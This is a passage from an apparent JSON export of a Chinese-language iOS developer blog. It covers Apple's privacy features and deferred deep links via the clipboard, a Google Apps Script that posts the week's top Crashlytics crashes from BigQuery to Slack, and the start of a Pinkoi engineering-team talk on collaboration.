App 之間的資料。做法可以在 App 畫面上偷塞一個 1 pixel 的 WebView 元件在背景偷偷讀取 Safari Cookie 回來用。 🈲，iOS &gt;= 11 禁止 Safari 和 App WebView 間共用 Cookie如果有需要取得 Safari 的 Cookie (EX: 直接使用網站 Cookie 登入)，可以使用 SFSafariViewController 元件取得；但此元件強迫跳提示視窗且無法客製化，確保使用者不會在無意間被偷取 Cookie。第二種方法是同網站與網站用IP Address + 裝置資訊算出的 Fingerprint 在不同網站中識別出同個瀏覽者：同前述， iOS ≥ 15 已被 Private Relay 混淆。最後一種也是唯一還能的方法 — Pasteboard ：使用剪貼簿串接跨平台的資訊，因為蘋果不可能禁用剪貼簿跨 App 使用，但是它可以提示使用者。 ⚠️ iOS &gt;= 14 新增剪貼簿存取警告⚠️ 2022/07/22 Update: iOS 16 Upcoming ChangesiOS ≥ 16 開始非使用者主動操作貼上動作，App 主動讀取剪貼簿的行為會跳出詢問視窗，使用者需要按允許，App 才能讀取到剪貼簿資訊。UIPasteBoard’s privacy change in iOS 16使用 Pasteboard 實現 Deferred Deep Link 延遲深度連結實作 這邊要多提一下關於 iOS 14 剪貼簿的隱私恐慌，詳細可參考我之前的文章「 iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難 」雖然不能排除讀取剪貼簿是想竊資，但更多時候是我們 App 需要提供更好的使用體驗：在沒有實現 Deferred Deep Link 延遲深度連結之前，當我們引導使用者從網站上去安裝 App，安裝完成後打開 App 默認只會打開首頁；更好的使用體驗應該是打開 App 回復到網頁上停留的頁面的 App 對應頁。要實現這個功能就需要 網站與 App 之間有機會串起資料，如文章前述的其他方法都已被封禁，目前僅能透過剪貼簿做為資訊儲存媒介（如上圖）。包含 Firebase Dynamic Links、Branch.io 最新版(之前 Branch.io 用 IP Adrees Fingerprint 來實現)也都使用剪貼簿做 Deferred Deep Link。實作可參考我之前的文章： iOS Deferred Deep Link 延遲深度連結實作(Swift) 一般情況下如果是為了要做到 Deferred Deep Link 僅會在第一次打開 App、重新返回 App 那一刻去讀取剪貼簿資訊；不會在使用中或奇怪的時間點讀取，這一點值得注意。更好的做法是先用 UIPasteboard.general.detectPatterns 探測剪貼簿的資料是不是我們需要的，是在讀取。測試專案iOS ≥ 15 之後優化了剪貼簿提示，如果是使用者自己的貼上動作，就不會再跳提示了！廣告成效解決方案同前文所說的蘋果隱私原則，希望的是平衡而不是完全阻斷使用者與服務。網站與網站的廣告成效統計：Safari 上相對於阻擋 Intelligent Tracking Prevention 的功能就是 Private Click Measurement ( WebKit ) 用於在去除個人隱私的情況下統計廣告成效。具體流程如上圖，使用者在 A 網站點擊廣告前往 B 網站時，會在瀏覽器上紀錄一個 Source ID (識別同個使用者用) 與 Destination 資訊 (目標網站)；當使用者在 B 網站上完成轉換也會紀錄一個 Trigger ID (代表什麼動作) 在瀏覽器上。這兩個資訊會合併起來在隨機 24 ~ 48 小時後傳送到 A 和 B 網站得到廣告成效。一切都是 on-device safari 自行處理、防範惡意點擊也是由 Safari 提供保護。App 與 網站或 App 之間的廣告成效統計：可以使用 SKAdNetwork (需向蘋果申請加入) 類似 Private Click Measurement 方式，不再展開贅述。 可以多提一下，蘋果並非閉門造車； SKAdNetwork 目前來到 2.0 版本，蘋果持續收集開發者廣告商的需求綜合個人隱私控管，持續優化 SDK 功能。 這邊真心許願 Deferred Deep Link 能用 SDK 串起，因為我們是為了提升使用者體驗，沒有要侵犯個人隱私的意思。技術細節可參考「 WWDC 2021 — Meet privacy-preserving ad attribution 」。Cross-Platform iOS ≥ 13 所有支援第三方登入的 App 都需要多實作 Sign in with Apple，否則無法成功上架 App 姓名可自行編輯 可隱藏真實 Email (使用蘋果產的虛擬 Email 代替) 使用者可要求刪除帳號 2022/01/31 前 App 須完成實作 🆕 iOS &gt;= 15 iCloud+ 用戶支援 Hide My Email 支援 Safari、App 所有信箱欄位 使用者可到設定中任意產生虛擬信箱同 Sign in with Apple 使用蘋果產的虛擬 Email 代替真實信箱，在收到信後蘋果會轉發到你的真實信箱中，藉此保護你的信箱資訊。類似 10 分鐘信箱，但又更強大；只要不停用，那組虛擬信箱地址就是你永久持有；也沒有新增上限，可以無限新增，不確定蘋果如何防止濫用。設定 -&gt; Apple ID -&gt; 隱藏我的電子郵件OthersApp privacy details on the App Store： App 必需在 App Store 上說明使用者哪些資料會被追蹤及如何應用 。詳細說明可參考：「 App privacy details on the App Store 」。個人隱私資料細微控制： iOS ≥ 14 開始，位置及相片存取可以更細微的控制，可以只授權取用某幾張相片、只允許 App 使用中存取位置。測試專案 iOS ≥ 15，增加 CLLocationButton 按鈕提升使用者體驗，可以在未詢問/未同意情況下透過使用者點擊取得當前位置，此按鈕無法客製化、只能透過使用者操作觸發。個人隱私取用提示： iOS ≥ 15，增加個人隱私功能的取用提示，如：剪貼簿、位置、相機、麥克風App 隱私取用報告： iOS ≥ 15，可以匯出近 7 天手機所有 App 的隱私相關功能取用、網路活動的紀錄報告。 因紀錄報告檔案是 .ndjson 純文字檔，直接查看不易；可以先在 App Store 下載「 隱私洞見 」App 用來查看報告 到設定 -&gt; 隱私權 -&gt; 最下方「紀錄 App 活動」-&gt; 啟用紀錄 App 活動 儲存 App 活動 選擇「匯入到 隱私洞見 」 匯入完成後即可檢視隱私報告可以看到同 新聞 所說，Wechat 的確會再啟動 App 時在背景偷偷讀取相片資訊。 另外我也多抓到幾個中國 App 也會偷做事，直接在設定全部禁用它們的權限了。 要不是有這個功能讓他們見光死，還不知道我們的資料會被竊取多久！RecapApple’s privacy principles了解完歷年對於隱私功能的調整後，我們回頭來看蘋果的隱私原則： Data Minimization：蘋果用技術手段限制取用需要的資料 On-Device Processing：隱私資料不上傳雲端，一切都在本地處理；如 Safari Private Click Measurement、蘋果的 機器學習 SDK CoreML 也都是在本地執行、iOS ≥ 15 的 Siri/相機原況文字功能、Apple Map、News、相片識別功能…等等 User Transparency and Control：新增的各種隱私存取提示、紀錄報告及隱私細微控制功能 Security：資料儲存傳遞的安全，不濫用 UserDefault、iOS 15 可以直接用 CryptoKit 來做點對點加解密、Private Realy 的傳輸安全破碎資料回到最一開始用技術手段拼湊出哈里的關聯圖，網站與網站或 App 之間被堵死，只剩剪貼還能用，但會有提示。服務註冊跟第三方登入的個資，可以改用 Sign in with apple 和 hide my email 功能防堵；或是多使用 iOS 原生 App。線下活動或許可以改 Apple Card 防止隱私外洩？ 已沒有人有機會拼湊出哈里的活動輪廓。Apple 以人為本因此「以人為本」是我會給蘋果的理念的代名詞，要與商業市場唱反調需要很大的信念；與它相關的「以科技為本」是我會給 Google 的代名詞，因為 Google 總能造出很多 Geek 科技項目；最後「以商業為本」是我會給 Facebook 的代名詞，因為 FB 在很多層面上都只追求商業收益。除了針對隱私功能的調整，這幾年的 iOS 也不斷加強防止手機沈迷的功能，推出了「螢幕使用時間報告」、「App 使用時間限制」、「專注模式」…等等功能；幫助大家解除手機成癮。最後希望大家都能 重視個人隱私 不被資本控制 減少虛擬成癮 防止社會沈淪 在現實世界活出精彩人生！Private Relay/IDFA/Pasteboard/Location 測試專案：參考資料 WWDC 2021 — Apple’s privacy pillars in focus Apple privacy white paper — A Day in the Life of Your Data WWDC 2021 — Get ready for iCloud Private Relay WWDC 2021 — Meet privacy-preserving ad attribution iOS 14 剪貼簿竊資恐慌，隱私與便利的兩難 iOS Deferred Deep Link 延遲深度連結實作(Swift) iOS UUID 的那些事 (Swift/iOS ≥ 6)有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 3,303 Total Views Last Statistics Date: 2025-01-19 | 2,966 Views on Medium. " }, { "title": "Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具", "url": "/posts/e77b80cc6f89/", "categories": "ZRealm Dev.", "tags": "ios-app-development, crashlytics, firebase, bigquery, slack", "date": "2021-10-19 22:33:30 +0800", "snippet": "Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具串接 Crashlytics 和 Big Query 自動轉發閃退記錄到 Slack Channel成果Pinkoi iOS Team 實拍圖先上成果圖，每週定時查詢 Crashlytics 閃退紀錄；篩選出閃退次數前 10 多的問題；將訊息發送到 Slack Channel，方便所有 iOS 隊友快速了解...", "content": "Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具串接 Crashlytics 和 Big Query 自動轉發閃退記錄到 Slack Channel成果Pinkoi iOS Team 實拍圖先上成果圖，每週定時查詢 Crashlytics 閃退紀錄；篩選出閃退次數前 10 多的問題；將訊息發送到 Slack Channel，方便所有 iOS 隊友快速了解目前穩定性。問題於 App 開發者來說 Crash-Free Rate 可以說是最重要的衡量指標；數據代表的意思是 App 的使用者 沒遇到 閃退的比例，我想不管是什麼 App 都應該希望自己的 Crash-Free Rate ~= 99.9%；但現實是不可能的，只要是程式就可能會有 Bug 更何況有的閃退問題是底層(Apple)或第三方 SDK 造成的，另外隨著 DAU 體量不同，也會對 Crash-Free Rate 有一定影響，DAU 越高越容易踩到很多偶發的閃退問題。既然 100% 不會閃退的 App 並不存在，那如何追蹤、處理閃退就是一件很重要的事；除了最常見的 Google Firebase Crashlytics (前生 Fabric) 外其實還有其他選擇 Bugsnag 、 Bugfender …各工具我沒有實際比較過，有興趣的朋友可以自行研究；如果是用其他工具就用不到本篇文章要介紹的內容了。Crashlytics選擇使用 Crashlytics 有以下好處： 穩定，由 Google 撐腰 免費、安裝便利快速 除閃退外，也可 Log Error Event (EX: Decode Error) 一套 Firebase 即可打天下：其他服務還有 Google Analytics、Realtime Database、Remote Config、Authentication、Cloud Messaging、Cloud Storage… 題外話：不建議正式的服務完全使用 Firebase 搭建，因為後期流量起來後的收費會很貴…就是個養套殺的概念。Crashlytics 缺點也很多： Crashlytics 不提供 API 查詢閃退資料 Crashlytics 僅會儲存近 90 天閃退紀錄 Crashlytics 的 Integrations 支援跟彈性極差最痛的就是 Integrations 支援跟彈性極差再加上又沒有 API 可以自己寫腳本串閃退資料；只能三不五時靠人工手動上 Crashlytics 查看閃退紀錄，追蹤閃退問題。Crashlytics 只支援的 Integrations： [Email 通知] — Trending stability issues (越來越多人遇到的閃退問題) [Slack, Email 通知] — New Fatal Issue (閃退問題) [Slack, Email 通知] — New Non-Fatal Issue (非閃退問題) [Slack, Email 通知] — Velocity Alert (數量突然一直上升的閃退問題) [Slack, Email 通知] — Regression Alert (已 Solved 但又出現的問題) Crashlytics to Jira issue以上 Integrations 的內容、規則都無法客製化。最一開始我們直接使用 2.New Fatal Issue to Slack or Email，to Email 的話再由 Google Apps Script 觸發後續處理腳本 ；但是這個通知會瘋狂轟炸通知頻道，因為不管是大是小或只是使用者裝置、iOS 本身很零星的問題造成的閃退都會通知；隨著 DAU 增長每天都被這通知狂轟濫炸，而其中真的有價值，很多人踩到而且是跟我們程式錯誤有關的通知大概只佔其中的 10%。以至於根本沒有解決 Crashlytics 難以自動追蹤的問題，一樣要花很多時間在審閱這個問題究竟重不重要之上。Crashlytics + Big Query轉來轉去只找到這個方法，官方也只提供這個方法；這就是免費糖衣下的陷阱，我猜不管是 Crashlytics 或 Analytics Event 都不會也沒有計劃推出 API 讓使用者可以串 API 查資料；因為官方的唯一建議就是把資料匯入到 Big Query 使用，而 Big Query 超過免費儲存與查詢額度是要收費的。 儲存：每個月前 10 GB 為免費。 查詢：每個月前 1 TB 為免費。 (查詢額度的意思是下 Select 時處理了多少容量的資料) 詳細可參考 Big Query 定價說明Crashlytics to Big Query 的設定細節可參考 官方文件 ，需啟用 GCP 服務、綁定信用卡…等等。開始使用 Big Query 查詢 Crashlytics Log設好 Crashlytics Log to Big Query 匯入週期＆完成第一次匯入有資料後，我們就能開始查詢資料囉。首先到 Firebase 專案 -&gt; Crashlytics -&gt; 列表右上方的「•••」-&gt; 點擊前往「BigQuery dataset」。前往 GCP -&gt; Big Query 後可在左方「Exploer」中選擇「firebase_crashlytics」-&gt;選擇你的 Table 名稱 -&gt;「Detail」 -&gt; 右邊可查看 Table 資訊，包含最新修改時間、已使用容量、儲存期限…等等。 確認已有匯入的資料可查詢。上方 Tab 可切換到「SCHEMA」查看 Table 的欄位資訊或參考 官方文件 。點擊右上方的「Query」可開啟帶有輔助 SQL Builder 的介面(如對 SQL 不熟建議使用這個)：或直接點「COMPOSE NEW QUERY」開一個空白的 Query Editor：不管是哪種方法，都是同個文字編輯器；在輸入完 SQL 之後可以預先在右上方自動完成 SQL 語法檢查和預計會花費的查詢額度( This query will process XXX when run. )：確認要查詢後點左上方「RUN」執行查詢，結果會在下方 Query results 區塊顯示。 ⚠️ 按下「RUN」執行查詢後就會累積到查詢額度，然後進行收費；所以請注意不要亂下 Query。如對 SQL 較陌生可以先了解基本用法，然後參考 Crashlytics 官方的範例下去魔改 ：1.統計近 30 日每天的閃退次數：SELECT COUNT(DISTINCT event_id) AS number_of_crashes, FORMAT_TIMESTAMP(\"%F\", event_timestamp) AS date_of_crashesFROM `你的ProjectID.firebase_crashlytics.你的TableName`GROUP BY date_of_crashesORDER BY date_of_crashes DESCLIMIT 30;2.查詢近 7 天最常出現的 TOP 10 閃退：SELECT DISTINCT issue_id, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user, blame_frame.file, blame_frame.lineFROM `你的ProjectID.firebase_crashlytics.你的TableName`WHERE event_timestamp &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(),INTERVAL 168 HOUR) AND event_timestamp &lt; CURRENT_TIMESTAMP()GROUP BY issue_id, blame_frame.file, blame_frame.lineORDER BY number_of_crashes DESCLIMIT 10; 但官方範例這個下法查出來的資料跟 Crashlytics 看到的排序不一樣，應該是它用 blame_frame.file (nullable), blame_frame.line (nullable) 去 Group 的原因導致。3.查詢近 7 天最常閃退的 10 種裝置：SELECT device.model,COUNT(DISTINCT event_id) AS number_of_crashesFROM `你的ProjectID.firebase_crashlytics.你的TableName`WHERE event_timestamp &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 168 HOUR) AND event_timestamp &lt; CURRENT_TIMESTAMP()GROUP BY device.modelORDER BY number_of_crashes DESCLIMIT 10;更多範例請參考 官方文件 。 如果你下的 SQL 無任何資料，請先確定指定條件的 Crashlytics 資料已匯入 Big Query（例如預設的 SQL 範例會查當天 Crash 紀錄，但其實資料還沒同步匯入進來，所以會查不到）；如果確定有資料，再來檢查篩選條件是否正確。Top 10 Crashlytics Issue Big Query SQL這邊參考第 2. 的官方範例修改，我們希望的結果是跟我們看 Crashlytics 第一頁時一樣的閃退問題及排序資料。近 7 日閃退問題的 Top 10：SELECT DISTINCT issue_id, issue_title, issue_subtitle, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user FROM `你的ProjectID.firebase_crashlytics.你的TableName`WHERE is_fatal = true AND event_timestamp &gt;= TIMESTAMP_SUB( CURRENT_TIMESTAMP(), INTERVAL 7 DAY ) GROUP BY issue_id, issue_title, issue_subtitle ORDER BY number_of_crashes DESC LIMIT 10;比對 Crashlytics 的 Top 10 閃退問題結果，符合✅。使用 Google Apps Script 定期查詢＆轉發到 Slack前往 Google Apps Script 首頁 -&gt; 登入與 Big Query 同個帳戶 -&gt; 點左上角「新專案」，開啟新專案後可點左上方重新命名專案。首先我們先完成串接 Big Query 取得查詢資料：參考 官方文件 範例，將上面的 Query SQL 帶入。function queryiOSTop10Crashes() { var request = { query: 'SELECT DISTINCT issue_id, issue_title, issue_subtitle, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user FROM `firebase_crashlytics.你的TableName` WHERE is_fatal = true AND event_timestamp &gt;= TIMESTAMP_SUB( CURRENT_TIMESTAMP(), INTERVAL 7 DAY ) GROUP BY issue_id, issue_title, issue_subtitle ORDER BY number_of_crashes DESC LIMIT 10;', useLegacySql: false }; var queryResults = BigQuery.Jobs.query(request, '你的ProjectID'); var jobId = queryResults.jobReference.jobId; // Check on status of the Query Job. var sleepTimeMs = 500; while (!queryResults.jobComplete) { Utilities.sleep(sleepTimeMs); sleepTimeMs *= 2; queryResults = BigQuery.Jobs.getQueryResults(projectId, jobId); } // Get all the rows of results. var rows = queryResults.rows; while (queryResults.pageToken) { queryResults = BigQuery.Jobs.getQueryResults(projectId, jobId, { pageToken: queryResults.pageToken }); Logger.log(queryResults.rows); rows = rows.concat(queryResults.rows); } var data = new Array(rows.length); for (var i = 0; i &lt; rows.length; i++) { var cols = rows[i].f; data[i] = new Array(cols.length); for (var j = 0; j &lt; cols.length; j++) { data[i][j] = cols[j].v; } } return data}query： 餐數可任意更換成寫好的 Query SQL。回傳的物件結構如下：[ [ \"67583e77da3b9b9d3bd8feffeb13c8d0\", \"&lt;compiler-generated&gt; line 2147483647\", \"specialized @nonobjc NSAttributedString.init(data:options:documentAttributes:)\", \"417\", \"355\" ], [ \"a590d76bc71fd2f88132845af5455c12\", \"libnetwork.dylib\", \"nw_endpoint_flow_copy_path\", \"259\", \"207\" ], [ \"d7c3b750c3e5587c91119c72f9f6514d\", \"libnetwork.dylib\", \"nw_endpoint_flow_copy_path\", \"138\", \"118\" ], [ \"5bab14b8f8b88c296354cd2e\", \"CoreFoundation\", \"-[NSCache init]\", \"131\", \"117\" ], [ \"c6ce52f4771294f9abaefe5c596b3433\", \"XXX.m line 975\", \"-[XXXX scrollToMessageBottom]\", \"85\", \"57\" ], [ \"712765cb58d97d253ec9cc3f4b579fe1\", \"&lt;compiler-generated&gt; line 2147483647\", \"XXXXX.heightForRow(at:tableViewWidth:)\", \"67\", \"66\" ], [ \"3ccd93daaefe80f024cc8a7d0dc20f76\", \"&lt;compiler-generated&gt; line 2147483647\", \"XXXX.tableView(_:cellForRowAt:)\", \"59\", \"59\" ], [ \"f31a6d464301980a41367b8d14f880a3\", \"XXXX.m line 46\", \"-[XXXX XXX:XXXX:]\", \"50\", \"41\" ], [ \"c149e1dfccecff848d551b501caf41cc\", \"XXXX.m line 554\", \"-[XXXX tableView:didSelectRowAtIndexPath:]\", \"48\", \"47\" ], [ \"609e79f399b1e6727222a8dc75474788\", \"Pinkoi\", \"specialized JSONDecoder.decode&lt;A&gt;(_:from:)\", \"47\", \"38\" ]]可以看到是一個二維陣列。加上轉發 Slack 的 Function：在上述程式碼下方繼續加入新 Function。function sendTop10CrashToSlack() { var iOSTop10Crashes = queryiOSTop10Crashes(); var top10Tasks = new Array(); for (var i = 0; i &lt; iOSTop10Crashes.length ; i++) { var issue_id = iOSTop10Crashes[i][0]; var issue_title = iOSTop10Crashes[i][1]; var issue_subtitle = iOSTop10Crashes[i][2]; var number_of_crashes = iOSTop10Crashes[i][3]; var number_of_impacted_user = iOSTop10Crashes[i][4]; var strip_title = issue_title.replace(/[\\&lt;|\\&gt;]/g, ''); var strip_subtitle = issue_subtitle.replace(/[\\&lt;|\\&gt;]/g, ''); top10Tasks.push(\"&lt;https://console.firebase.google.com/u/1/project/你的ProjectID/crashlytics/app/你的專案ID/issues/\"+issue_id+\"|\"+(i+1)+\". Crash: \"+number_of_crashes+\" 次 (\"+number_of_impacted_user+\"人) - \"+strip_title+\" \"+strip_subtitle+\"&gt;\"); } var messages = top10Tasks.join(\"\\n\"); var payload = { \"blocks\": [ { \"type\": \"header\", \"text\": { \"type\": \"plain_text\", \"text\": \":bug::bug::bug: iOS 近 7 天閃退問題排行榜 :bug::bug::bug:\", \"emoji\": true } }, { \"type\": \"divider\" }, { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": messages } }, { \"type\": \"divider\" }, { \"type\": \"actions\", \"elements\": [ { \"type\": \"button\", \"text\": { \"type\": \"plain_text\", \"text\": \"前往 Crashlytics 查看近 7 天紀錄\", \"emoji\": true }, \"url\": \"https://console.firebase.google.com/u/1/project/你的ProjectID/crashlytics/app/你的專案ID/issues?time=last-seven-days&amp;state=open&amp;type=crash&amp;tag=all\" }, { \"type\": \"button\", \"text\": { \"type\": \"plain_text\", \"text\": \"前往 Crashlytics 查看近 30 天紀錄\", \"emoji\": true }, \"url\": \"https://console.firebase.google.com/u/1/project/你的ProjectID/crashlytics/app/你的專案ID/issues?time=last-thirty-days&amp;state=open&amp;type=crash&amp;tag=all\" } ] }, { \"type\": \"context\", \"elements\": [ { \"type\": \"plain_text\", \"text\": \"Crash 次數及發生版本僅統計近 7 天之間數據，並非所有資料。\", \"emoji\": true } ] } ] }; var slackWebHookURL = \"https://hooks.slack.com/services/XXXXX\"; //更換成你的 in-coming webhook url UrlFetchApp.fetch(slackWebHookURL,{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) })} 如果不知道怎麼取得 in-cming WebHook URL 可以參考 此篇文章 的「取得 Incoming WebHooks App URL」章節。測試＆設定排程此時你的 Google Apps Script 專案應該會有上述兩個 Function。接下來請在上方的選擇「sendTop10CrashToSlack」Function，然後點擊 Debug 或 Run 執行測試一次；因第一次執行需要完成身份驗證，所以請至少執行過一次再進行下一步。執行測試一次沒問題後，可以開始設定排程自動執行：於左方選擇鬧鐘圖案，再選擇右下方「+ Add Trigger」。第一個「Choose which function to run」(需要執行的 function 入口) 請改為 sendTop10CrashToSlack ，時間週期可依個人喜好設定。 ⚠️⚠️⚠️ 請特別注意每次查詢都會累積然後收費的，所以千萬不要亂設定；否則可能被排程自動執行搞到破產。完成範例成果圖現在起，你只要在 Slack 上就能快速追蹤當前 App 閃退問題；甚至直接在上面進行討論。App Crash-Free Users Rate？如果你想追的是 App Crash-Free Users Rate，可參考下篇「 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 」延伸閱讀 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 Slack 打造全自動 WFH 員工健康狀況回報系統 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,256 Total Views Last Statistics Date: 2025-01-19 | 1,177 Views on Medium. " }, { "title": "2021 Pinkoi Tech Career Talk —  高效率工程團隊大解密", "url": "/posts/11f6c8568154/", "categories": "Pinkoi Engineering", "tags": "pinkoi, automation, ios-app-development, engineering-mangement, workflow", "date": "2021-09-09 20:13:53 +0800", "snippet": "2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密Pinkoi 高效率工程團隊大解密 Tech Talk 分享高效率工程團隊大解密2021/09/08 19:00 @ Pinkoi x YouratorMy Medium： ZhgChgLi關於團隊Pinkoi 的工作方式是由多個 Squad (小隊)組成： Buyer-Squad ：主攻買家端功能 Sel...", "content": "2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密Pinkoi 高效率工程團隊大解密 Tech Talk 分享高效率工程團隊大解密2021/09/08 19:00 @ Pinkoi x YouratorMy Medium： ZhgChgLi關於團隊Pinkoi 的工作方式是由多個 Squad (小隊)組成： Buyer-Squad ：主攻買家端功能 Seller-Squad ：主攻設計師端功能 Exploring-Squad：主攻瀏覽探索 Ad-Squad：主攻平台廣告 Out-Of-Squad：主要做支援、Infra 或 流程優化每個 Squad 會由各 Function 隊友共同組成，有 PM、Product Designer、Data、Frontend、Backend、iOS、Android…等等；長期、持續性的工作目標都會由 Squad 來完成。除了 Squad 之外也會有些跨團隊 Run 的 Project，多半時中短期的工作目標，可以是發起人或任何職務的隊友擔任 Project Owner，任務完成後即 Close。 文末還有 關於 Pinkoi 的文化是如何支持隊友解決問題 ，如果 對實際做了什麼內容不感興趣的朋友，可直接到頁底查看此章節 。人數規模與效率關係人數規模成長跟工作效率的關係，待過 10 個人的新創到百人的團隊（還沒挑戰過千人）但是光從 10 跳到 100，10 倍的差距在很多事上就很有感了。人少，溝通跟處理事情都很快，走過去討論好，等下就可以馬上給你了；因為「人與人的連結」相當強烈，彼此都能同步協作。但在人多的情況，很難這樣直接溝通，因為一起協作的人變多了，每個都走去講一整個上午就沒了；還有大家互相協作的人也很多，事情只能排優先順序來處理，不是緊急的事不可能馬上給你，這時候就要非同步的等待，去做其他事情。更多職務的人加入，可以讓工作分工更細緻專業、提供更多產能或更好的品質、更快的產出。但如同開頭說的，相對的；會有更多與人的協作，協作相對的就是會有更多溝通時間。還有小問題會被加倍放大，例如本來 1 個人每天都需要花 10 分鐘貼報表，可以接受；但現在假設變 20 個人，乘下來每天都要多花 3 個多小時貼報表；這時候貼報表這件事的優化、自動化就會很有價值，每天省 3 小時，一年工作日抓 250 天，就要多浪費 750 小時。人數規模成長，以 App Team 為例，會有比較密切協作的有這些職務。Backend — API、Product Designer — UI 這不用講，Pinkoi 是國際級的產品所以在功能上的文字都需要 Localization Team 幫我們翻譯，還有因為我們有 Data Team 在做資料搜集分析，所以除了開發功能，還需要與 Data Team 討論事件埋設點。Customer Service 也是會經常與我們有互動關係的 Team，除了使用者有時會直接透過商城評價反應訂單問題，更多的時候是使用者直接留下一顆星說遇到問題，這時候也需要請客服團隊幫忙做深入的詢問，是遇到什麼問題？我們怎麼幫助你？有以上那麼多的協作關係，意味著很多溝通機會。 但要記得，我們不是在逃避或是盡可能減少溝通，優秀的工程師溝通能力也很重要。我們要做的事是聚焦在重要的溝通上，如創意發想、需求內容跟時程的討論；不要浪費時間在重複問題的確認，或發散模糊的溝通，你問我問我他的情況也要避免。尤其疫情時代，溝通時間寶貴，要放在更有價值的討論上。「我以為你以為的我以為的以為」 — 這句話完美詮釋了模糊溝通的後果。不要說工作了，日常生活上我們也很常會遇到因為雙方認知不同導致的誤會，生活上輕鬆自在靠的是彼此的默契；但工作上就不行了，雙方認知不同如果沒深入討論，很容易到產出階段才發現怎麼跟想的都不一樣。介面溝通這邊引入的想法是透過一個共識的介面來做溝通，就類似我們工程物件導向程式設計中， SOLID 原則裡的 依賴反轉原則 Dependency inversion principle (不懂也沒關係)；在溝通上也能應用相同的概念。第一步是找出什麼地方是模糊的、每次都要重複確認的溝通，或是需要什麼溝通才能更聚焦有效，甚至只需要這個交付就不需要額外溝通的事。找出問題後就能定義出「介面」，介面就是媒介的意思，可以是一份問件、流程、check list 或工具…等等使用這個「介面」作為彼此溝通的橋樑，介面可以有多個，什麼場景就用什麼介面；遇到相同場景優先使用這個介面來做初步溝通；如果還有需求要溝通，可以基於這個介面深入聚焦的討論問題。App Team 與外部協作關係以下以 App Team 協作為例舉 4 個介面溝通的例子：第一個是與 Backend 協作在沒有任何介面共識前可能會有上圖情況。對於 API 怎麼用，如果單純地將 API Response String 給 App Team 容易有模糊地帶，例如 date 我們怎們知道是 Register Date? 還是 Birthday?，還有範圍很廣，很多欄位需要確認。這個溝通也是重複的，每次有新的 Endpoint 都要再確認一次。這就是很經典的無效溝通案例。App 與 Backend 彼此缺少的就是一個溝通介面，Solution 有很多種，也不一定要用工具；可以只是一份人工維護的文件。這塊 2020 Pinkoi 開發者之夜有跟大家分享過 — by TokiPinkoi 使用的是 Python (FastAPI) 從 API Code 自動產生文件，PHP 可以用 Swagger (之前公司做法)；優點是文件的大框架、資料格式都能從 Code 自動產生出來，降低維護成本，只需處理好欄位說明即可。p.s. 目前新的 Python 3 都會使用 FastAPI，舊的部分會逐步更新，暫時先用 PostMan 做為溝通介面。第二個是與 Product Designer 的協作，其實道理上與 Backend 類似，只是問題換成是確認 UI Spec、確認 Flow。色碼、字型如果零散，我們 App 也會很痛苦，撇開需求本來就是這樣，我們不想要有同個 Title 有明明顏色一樣但色碼跑掉或同個位置 UI 不統一的狀況。Solution 最基本的就是要先請設計大大整理好 UI 的元件庫、建立好 Design System (Guideline)，並在出 UI 時做好標記。我們在 Code Base 上根據 Design System (Guideline) 去建立相應的 Font、Color、根據元件庫建立出 Button、View。套版的時候統一使用這些已建立好的元件來套版，方便我們直接看 UI 設計稿就能快速對齊。 但這個很容易亂掉，要動態的調整；不能涵蓋太多特例，也不能固守都不擴充。p.s. 在 Pinkoi 與 Product Designer 的協作是互相的，Developer 也能提出更好的做法與 Product Designer 討論。第三個是和 Customer Service 的介面，商城的評價對產品很重要但他卻是一個非常人工跟重複轉介溝通的事。因為要時不時人工上去看一下新評價，如過有客服問題再將問題轉發給客服協助處理，很重複、人工。這個最佳解就是讓商城評價能自動同步到我們的工作平台，可以花 $ 買現有的服務，或是用我開發的 ZhgChgLi / ZReviewTender (2022 新)。 部署方式、教學及技術細節可參考： ZReviewTender — 免費開源的 App Reviews 監控機器人這個機器人就是我們的溝通介面，他會將評價自動轉發到 Slack Channel，大家能快速收到最新評價資訊，並在上面追蹤、溝通討論。最後一個例子，是與 Localization Team 的工作依賴；不管是新功能或修改舊翻譯，都需要等 Localization Team 完成工作交給我們後續協助處理。這個自行開發工具的成本太高，所以直接使用第三方服務來協助我們解除依賴關係。所有翻譯、Key 都由第三方工具管理，我們只要事先定好 Key 就能分頭行動，雙方只要在 Deadline 打包前完成工作即可，不用互相依賴；Localization Team 完成翻譯後，工具會自動觸發 git pull 更新最新的文字檔到專案內。p.s Pinkoi 因很早期就有這流程，當時選用的是 Onesky 不過這幾年有更多優秀的工具可用，可以參考採用其他的。App Team 團隊內互相協作關係剛說的是外部，現在來說內部。在人少或是說一個開發者維護一個專案的時候；你想做什麼就做什麼，你對專案的掌握度、了解程度都很高，問題不大；當然你如果有好的 Sense 就算是一人專案也能做到這邊要提的所有事。但在互相協作的隊友越來越多的情況下，大家都在同個專案底下做事，如果還是各做各的將會是場災難。例如打 API 一下這邊這樣做一下那邊那樣做、很常重造輪子浪費時間或什麼都不 Care 直接隨便弄一弄上線，都會對未來的維護跟可擴充性增加巨大的成本。團隊內與其說是介面，我覺得太見外了；應該要說共識、共鳴更有團隊意識感。最基本的老生常談就是 Coding Style，命名的習慣、位置怎麼放、Delegate 怎麼用…之類；可以以入業界常用的 realm / SwiftLint 進行約束，多國語系語句可以用 